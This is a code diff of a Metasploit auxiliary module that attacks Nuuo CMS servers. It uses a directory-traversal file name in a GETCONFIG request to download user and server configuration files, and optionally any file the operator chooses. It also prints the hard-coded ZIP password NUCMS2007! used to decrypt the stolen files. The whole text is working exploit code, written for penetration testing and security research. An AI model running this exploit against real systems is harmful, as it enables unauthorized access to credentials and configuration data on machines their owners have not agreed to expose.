@@ -45,42 +45,49 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('FILE', [false, 'Additional file to download, use ..\\ to traverse directories from \
-        the CMS install folder'])
+        OptInt.new('DEPTH', [true, 'Directory traversal depth [..\]', 2]),
+        OptString.new('FILE', [false, 'Additional file to download'])
       ])
   end
 
-  def download_file(file_name, ctype='application/zip', decrypt=true)
-    dl_file = nucs_download_file(file_name, decrypt)
-    file_name = file_name.gsub('..\\', '')
+  def download_file(file_name, ctype='application/zip', depth=2)
+    res = ncs_send_request({
+      'method'        => 'GETCONFIG',
+      'user_session'  => user_session,
+      'file_name'     => %{#{"..\\"*depth}#{file_name}}
+    })
 
+    return nil unless res
     path = store_loot(file_name, ctype, datastore['RHOST'],
-                      dl_file, file_name, "Nuuo CMS #{file_name} downloaded")
+                      res.body, file_name, "Nuuo CMS #{file_name} downloaded")
     print_good("Downloaded file to #{path}")
   end
 
-
   def run
-    nucs_login
+    connect
+    res = ncs_login
 
-    unless @nucs_session
-      fail_with(Failure::NoAccess, 'Failed to login to Nuuo CMS')
+    unless res
+      fail_with(Failure::NoAccess, "Failed to login to Nuuo CMS")
     end
 
     download_file('CMServer.cfg')
     download_file('ServerConfig.cfg')
 
-    # note that when (if) archive/zip is included in msf, the code in the Nuuo mixin needs to be changed
-    # see the download_file method for details
-    print_status('The user and server configuration files were stored in the loot database.')
-    print_status('The files are ZIP encrypted, and due to the lack of the archive/zip gem,')
-    print_status('they cannot be decrypted in Metasploit.')
-    print_status('You will need to open them up with zip or a similar utility, and use the')
-    print_status('password NUCMS2007! to unzip them.')
-    print_status('Annoy the Metasploit developers until this gets fixed!')
+    info = %q{
+    The user and server configuration files were stored in the loot database.
+    The files are ZIP encrypted, and due to the lack of the archive/zip gem,
+    they cannot be decrypted in Metasploit.
+    You will need to open them up with zip or a similar utility, and use the
+    password NUCMS2007! to unzip them.
+    Annoy the Metasploit developers until this gets fixed!
+    }
+    print_status("\r\n#{info}")
 
     if datastore['FILE']
-      filedata = download_file(datastore['FILE'], 'application/octet-stream', false)
+      download_file(datastore['FILE'], 'application/octet-stream', datastore['DEPTH'])
     end
+
+    client.close
   end
 end
